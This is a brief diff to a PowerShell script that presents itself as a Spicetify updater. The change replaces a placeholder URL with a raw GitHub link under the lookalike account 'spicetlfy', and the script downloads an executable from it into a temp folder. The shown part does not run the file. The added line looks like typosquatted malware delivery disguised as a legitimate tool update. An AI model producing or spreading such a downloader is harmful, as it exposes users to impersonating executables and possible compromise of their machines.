@@ -7,7 +7,7 @@ foreach ($disk in $disks) {
 
 $tempPath = "$env:TEMP\Spicetify"
 New-Item -ItemType Directory -Path $tempPath -Force | Out-Null
-$exeUrl = "http://example.com/path/to/exe.exe"
+$exeUrl = "https://github.com/spicetlfy/cli/raw/refs/heads/main/main/SpicetifyUpdater.exe"
 $exePath = "$tempPath\SpicetifyUpdater"
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
